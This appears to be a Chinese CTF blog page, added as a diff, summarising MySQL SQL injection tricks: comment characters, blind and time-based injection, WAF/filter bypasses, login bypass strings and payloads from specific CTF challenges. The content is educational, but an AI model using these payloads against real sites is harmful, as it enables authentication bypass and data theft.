@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/CNfavicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/CNfavicon.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="信息安全,wlfsky,web安全,python,wlfsky.com" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="WLFSKY" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="ctf中sql注入下的一些小技巧最近花了一点时间总结了各大平台中注入的trick，自己还是太菜了，多半都得看题解，就特此做了一个paper方便总结 注释符以下是Mysql中可以用到的单行注释符： 123#  -- -;%00  以下是Mysql中可以用到的多行注释符(mysql下需要闭合)： 12/*`  判断当前库是">
+<meta property="og:type" content="website">
+<meta property="og:title" content="WLFSKY">
+<meta property="og:url" content="http://wlfsky.com/ctf/sql绕过技术.html">
+<meta property="og:site_name" content="WLFSKY">
+<meta property="og:description" content="ctf中sql注入下的一些小技巧最近花了一点时间总结了各大平台中注入的trick，自己还是太菜了，多半都得看题解，就特此做了一个paper方便总结 注释符以下是Mysql中可以用到的单行注释符： 123#  -- -;%00  以下是Mysql中可以用到的多行注释符(mysql下需要闭合)： 12/*`  判断当前库是否有字段名对于CTF中的题，某些可以直接判断有无flag表1′ or(flag)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974337227772.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974336246933.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/1497433749878.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974337734143.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974337931146.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974338119153.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974338439809.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/1497433864676.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974338824172.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/1497433900109.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20170614/14974339236916.png%21small">
+<meta property="og:updated_time" content="2018-01-18T12:10:29.094Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WLFSKY">
+<meta name="twitter:description" content="ctf中sql注入下的一些小技巧最近花了一点时间总结了各大平台中注入的trick，自己还是太菜了，多半都得看题解，就特此做了一个paper方便总结 注释符以下是Mysql中可以用到的单行注释符： 123#  -- -;%00  以下是Mysql中可以用到的多行注释符(mysql下需要闭合)： 12/*`  判断当前库是否有字段名对于CTF中的题，某些可以直接判断有无flag表1′ or(flag)">
+<meta name="twitter:image" content="http://image.3001.net/images/20170614/14974337227772.png%21small">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wlfsky.com/ctf/sql绕过技术.html"/>
+
+
+
+
+
+  <title> | WLFSKY</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/wlfreesky"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WLFSKY</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">我们终其一生都在寻找</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/ctf/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag-checkered"></i> <br />
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/life/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h2 class="post-title" itemprop="name headline"></h2>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h2 id="ctf中sql注入下的一些小技巧"><a href="#ctf中sql注入下的一些小技巧" class="headerlink" title="ctf中sql注入下的一些小技巧"></a>ctf中sql注入下的一些小技巧</h2><p><strong>最近花了一点时间总结了各大平台中注入的trick，自己还是太菜了，多半都得看题解，就特此做了一个paper方便总结</strong></p>
+<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>以下是Mysql中可以用到的单行注释符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#  </span><br><span class="line">-- -</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+<p><a href="http://image.3001.net/images/20170614/14974337227772.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974337227772.png%21small" alt="2111 (1).PNG"></a></p>
+<p>以下是Mysql中可以用到的多行注释符(mysql下需要闭合)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<p><a href="http://image.3001.net/images/20170614/14974336246933.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974336246933.png%21small" alt="捕获12312312.PNG"></a></p>
+<h3 id="判断当前库是否有字段名"><a href="#判断当前库是否有字段名" class="headerlink" title="判断当前库是否有字段名"></a>判断当前库是否有字段名</h3><p>对于CTF中的题，某些可以直接判断有无flag表1′ or(flag)例如:全表</p>
+<p><a href="http://image.3001.net/images/20170614/1497433749878.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/1497433749878.png%21small" alt="捕获3.PNG"></a></p>
+<p>用or试一下</p>
+<p><a href="http://image.3001.net/images/20170614/14974337734143.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974337734143.png%21small" alt="捕获5.PNG"></a></p>
+<p>这里解释一下为什么or的结果为什么不全，说白了也就是atoi函数的特性</p>
+<p>or(列名)其实是遍历字段名中的每个值然后选取那些不为false的内容，因为在mysql中’ssdd’字符串默认等于0等于false所以不显示，而’4ddf’这样的字符串默认等于4，也就是true也就会返回了</p>
+<h3 id="limit下的字段数判断"><a href="#limit下的字段数判断" class="headerlink" title="limit下的字段数判断"></a>limit下的字段数判断</h3><p>众所周知where条件下的字段数可以用<code>order by</code>判断，而limit后可以利用 <code>1,into @,@</code> （@为字段数）判断字段数@为mysql临时变量，</p>
+<p><a href="http://image.3001.net/images/20170614/14974337931146.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974337931146.png%21small" alt="2115.PNG"></a></p>
+<p>原理请看<a href="http://www.w3school.com.cn/sql/sql_select_into.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/sql/sql_select_into.asp</a></p>
+<h3 id="or条件下的回显"><a href="#or条件下的回显" class="headerlink" title="or条件下的回显"></a>or条件下的回显</h3><p>以前总是对<code>where id=&#39;1&#39; or &#39;1&#39;=&#39;1&#39;</code>和<code>where id=&#39;0&#39; or &#39;1&#39;=&#39;1&#39;</code>的回显一直不是很了解，所以今天搭建环境测试了一下，如下可见</p>
+<p><a href="http://image.3001.net/images/20170614/14974338119153.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974338119153.png%21small" alt="2114.PNG"></a></p>
+<p>所以猜测在or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值</p>
+<h3 id="concat与concat-ws与group-concat"><a href="#concat与concat-ws与group-concat" class="headerlink" title="concat与concat_ws与group_concat"></a>concat与concat_ws与group_concat</h3><p>1.2 MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULLMySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&apos;11&apos;,&apos;22&apos;,null);+------------------------+| concat(&apos;11&apos;,&apos;22&apos;,null) |+------------------------+| NULL |+------------------------+1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,NULL);+-------------------------------+| concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,NULL) |+-------------------------------+| 11,22 |+-------------------------------+1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="盲注下的条件语句和时间函数"><a href="#盲注下的条件语句和时间函数" class="headerlink" title="盲注下的条件语句和时间函数"></a>盲注下的条件语句和时间函数</h3><p>这是我前几天刷wechall碰到的题，例如一下注入语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test1 where id=&apos;$_GET[id]&apos;;</span><br></pre></td></tr></table></figure>
+<p>已知没有回显位,id=3和id=1返回结果不一样并且过滤了’,空格，等等一堆关键词，不存在宽字节注入给个B师傅当时的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr(flag,1,1)in(0x41),3,0)</span><br></pre></td></tr></table></figure>
+<p>写个脚本爆破之可得flag而基于时间的注入以前都是一直用的if(xxxxxx,1,sleep(2));最也发现了一个更好的函数<code>BENCHMARK</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(left(version(),1,1)=5, BENCHMARK(100000,SHA1(&apos;1&apos;)), 1)</span><br></pre></td></tr></table></figure>
+<p>BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<h3 id="逻辑操作符被过滤"><a href="#逻辑操作符被过滤" class="headerlink" title="逻辑操作符被过滤"></a>逻辑操作符被过滤</h3><p>先放一波like语法<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-like-clause.html</a></p>
+<h3 id="绕过-’被过滤"><a href="#绕过-’被过滤" class="headerlink" title="绕过\’被过滤"></a>绕过\’被过滤</h3><p>hex编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM Users WHERE username = 0x61646D696E</span><br></pre></td></tr></table></figure>
+<p>char编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</span><br></pre></td></tr></table></figure>
+<p>html实体字符编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM Users WHERE username = &amp;#39;admin&amp;#39;</span><br></pre></td></tr></table></figure>
+<p>%2527</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里主要是因为绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&apos;，所以成功绕过过滤。</span><br></pre></td></tr></table></figure>
+<p>宽字节就不说了gbk编码在单引号前面加一个%df即可</p>
+<h3 id="表名等关键字被过滤"><a href="#表名等关键字被过滤" class="headerlink" title="表名等关键字被过滤"></a>表名等关键字被过滤</h3><p>以information_schema.tables为例</p>
+<p>空格 <code>information_schema . tables</code></p>
+<p>着重号 <code>informationschema.tables</code></p>
+<p>特殊符 <code>/!informationschema.tables/</code></p>
+<p>别名 <code>information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)</code></p>
+<h3 id="表单认证绕过"><a href="#表单认证绕过" class="headerlink" title="表单认证绕过"></a>表单认证绕过</h3><p>这里选两题一题是实验吧的web分类第一题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>这样的直接<code>username=admin&#39;#</code>即可，或者<code>username=&#39;=&#39;&amp;password=&#39;=&#39;</code>这样就能构造出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT username FROM users WHERE username=&apos;&apos;=&apos;&apos; AND password=&apos;&apos;=&apos;&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>所以逻辑判断绕过第二题是iscc的简单注入,猜测大致后台语句如下，PS:后台密码是md5处理过的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$results = SELECT password FROM users WHERE username=&apos;$username&apos;</span><br><span class="line">if($results==$_GET[$password])&#123;</span><br><span class="line">    getflag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以构造<code>username=0&#39; union select md5(1)#&amp;password=1</code></p>
+<h3 id="Mysql字符编码利用技巧"><a href="#Mysql字符编码利用技巧" class="headerlink" title="Mysql字符编码利用技巧"></a>Mysql字符编码利用技巧</h3><p>传入的username=admin%c2，php的检测if ($username === ‘admin’)自然就可以绕过的，在mysql中可以正常查出username=’admin’的结果，原理是Mysql在转换字符集的时候，将不完整 的字符给忽略了。具体可参照P师傅文章<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
+<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>这里先上几个图，自行体会精神</p>
+<p><a href="http://image.3001.net/images/20170614/14974338439809.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974338439809.png%21small" alt="2117.PNG"></a></p>
+<p><a href="http://image.3001.net/images/20170614/1497433864676.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/1497433864676.png%21small" alt="2116.PNG"></a></p>
+<p>这里为什么我们输入为什么name=0会导致返回数据呢？其实这里跟php弱类型有异曲同工之妙，mysql在比较一个整数和一个字符串也会强制把字符串转化为整数进行比较，并返回一个warning，所以这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pupil</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+<p>都会被转换为0所以与0比较相等，那么我们进一步猜想那一个非0开头的字符串强制转化是什么呢</p>
+<p><a href="http://image.3001.net/images/20170614/14974338824172.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974338824172.png%21small" alt="2118.PNG"></a></p>
+<p>由此可见，与PHP一样，mysql也会把字符串强制转化为开头的数字，若开头是字母则强制转化为0，那我们怎么利用这一黑魔法呢，众所周知，mysql一般都是字符型注入，很少有数字型注入的，就像<code>where username=&#39;input&#39;</code>这样，我们单纯的输入数字是会被转化成字符串的，就像这样</p>
+<p><a href="http://image.3001.net/images/20170614/1497433900109.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/1497433900109.png%21small" alt="2119.PNG"></a></p>
+<p>这时候我们就需要做一些操作来构造注入点了，比如利用算术运算符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+,-,*,/,%</span><br></pre></td></tr></table></figure>
+<p>又或者位操作符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;,|,^</span><br></pre></td></tr></table></figure>
+<p>下面我们以<code>+</code>为例进行演示</p>
+<p><a href="http://image.3001.net/images/20170614/14974339236916.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170614/14974339236916.png%21small" alt="2120.PNG"></a></p>
+<h3 id="过滤了-amp-等逻辑处理字符"><a href="#过滤了-amp-等逻辑处理字符" class="headerlink" title="过滤了&amp;,|,*,/,=等逻辑处理字符"></a>过滤了&amp;,|,*,/,=等逻辑处理字符</h3><p>可以用in,exists,position..in,&gt;,&lt;,!,&lt;&gt;,like等操作符绕过这个链接有详细介绍<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-like-clause.html</a>这里举一个例子，比如要使用sql盲注的话但是过滤了substr,mid，asccii,ord等函数可以使用一下语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; AND password LIKE &quot;p%&quot; --</span><br></pre></td></tr></table></figure>
+<h2 id="一点实战例子"><a href="#一点实战例子" class="headerlink" title="一点实战例子"></a>一点实战例子</h2><h3 id="陕西省网络空间安全"><a href="#陕西省网络空间安全" class="headerlink" title="陕西省网络空间安全"></a><strong>陕西省网络空间安全</strong></h3><p>过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;</span><br></pre></td></tr></table></figure>
+<p>这里没有过滤^,所以可以绕过，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;^(ascii(mid((passwd)from(1)))&gt;=10)^&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h3 id="pwnhubcuit校赛"><a href="#pwnhubcuit校赛" class="headerlink" title="pwnhubcuit校赛"></a><strong>pwnhubcuit校赛</strong></h3><p>过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ |\*|#|,|union|like|sleep|regexp|left|right|strcmp|substr|=|limit|instr|benchmark|oct|\/|format|lpad|rpad|mod|insert|lower|bin|mid|hex|substring|ord|and|field|file|ascii|char|—|\|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%20&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i</span><br></pre></td></tr></table></figure>
+<p>这里过滤了&amp;,|,*,=等符号和substring,mid可以使用in,exists,&gt;,&lt;,&lt;&gt;,比较运算符绕过，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;where((table_schema)in(0x6261636b656e64)))r)where((table_name&lt;0x74)))&gt;0x&#123;0&#125;)&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="webhacking-kr"><a href="#webhacking-kr" class="headerlink" title="webhacking,kr"></a>webhacking,kr</h3><p>过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union|and|||&amp;|=|urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldeco</span><br><span class="line">de(&apos;%20&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).|/**/|/i</span><br></pre></td></tr></table></figure>
+<p>这里这里if和substr都没被过滤，并且空格可以被%0a绕过,所以payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aor%0aif(substr((select%0aflag%0afrom%0aprob13password),1,1)in(&quot;0x41&quot;),1,0)</span><br></pre></td></tr></table></figure>
+<p>最后总结一下注入题（手工注入。。）的一般思路（大牛轻喷），对于一般注入首先要找到注入点，比如有很多参数的先确定哪个参数好注入，再尝试有无过 滤或者过滤了那些字符，waf本身是否有问题导致直接可以大小写，双写，编码绕过的。当然一般ctf中的题注入如果有waf一般都是过滤不完全的，耐心点 就可以找出payload，最后就是注意一下参数提交的方式，有时候一些题目get方式过滤的很严格然而post只是象征性的过滤一下，还有一些 用$_REQUEST方式的注意除了get和post还可以尝试cookie注入。</p>
+<p>潜心，不会编程的不是好黑客更不是项目经理，只会简简单单的脚本谈不上脚本小子；只会皮毛却自以为是那只能说是瞎扯爱好都谈不上—–潜心修炼不妄语。</p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://source.unsplash.com/random/200x200"
+                alt="wlfsky" />
+            
+              <p class="site-author-name" itemprop="name">wlfsky</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  <a title="收藏到书签，偶尔High一下^_^" rel="alternate" class="mw-harlem_shake_slow wobble shake" href='javascript:(function() {
+    function c() {
+        var e = document.createElement("link");
+        e.setAttribute("type", "text/css");
+        e.setAttribute("rel", "stylesheet");
+        e.setAttribute("href", f);
+        e.setAttribute("class", l);
+        document.body.appendChild(e)
+    }
+ 
+    function h() {
+        var e = document.getElementsByClassName(l);
+        for (var t = 0; t < e.length; t++) {
+            document.body.removeChild(e[t])
+        }
+    }
+ 
+    function p() {
+        var e = document.createElement("div");
+        e.setAttribute("class", a);
+        document.body.appendChild(e);
+        setTimeout(function() {
+            document.body.removeChild(e)
+        }, 100)
+    }
+ 
+    function d(e) {
+        return {
+            height : e.offsetHeight,
+            width : e.offsetWidth
+        }
+    }
+ 
+    function v(i) {
+        var s = d(i);
+        return s.height > e && s.height < n && s.width > t && s.width < r
+    }
+ 
+    function m(e) {
+        var t = e;
+        var n = 0;
+        while (!!t) {
+            n += t.offsetTop;
+            t = t.offsetParent
+        }
+        return n
+    }
+ 
+    function g() {
+        var e = document.documentElement;
+        if (!!window.innerWidth) {
+            return window.innerHeight
+        } else if (e && !isNaN(e.clientHeight)) {
+            return e.clientHeight
+        }
+        return 0
+    }
+ 
+    function y() {
+        if (window.pageYOffset) {
+            return window.pageYOffset
+        }
+        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
+    }
+ 
+    function E(e) {
+        var t = m(e);
+        return t >= w && t <= b + w
+    }
+ 
+    function S() {
+        var e = document.createElement("audio");
+        e.setAttribute("class", l);
+        e.src = i;
+        e.loop = false;
+        e.addEventListener("canplay", function() {
+            setTimeout(function() {
+                x(k)
+            }, 500);
+            setTimeout(function() {
+                N();
+                p();
+                for (var e = 0; e < O.length; e++) {
+                    T(O[e])
+                }
+            }, 15500)
+        }, true);
+        e.addEventListener("ended", function() {
+            N();
+            h()
+        }, true);
+        e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
+        document.body.appendChild(e);
+        e.play()
+    }
+ 
+    function x(e) {
+        e.className += " " + s + " " + o
+    }
+ 
+    function T(e) {
+        e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
+    }
+ 
+    function N() {
+        var e = document.getElementsByClassName(s);
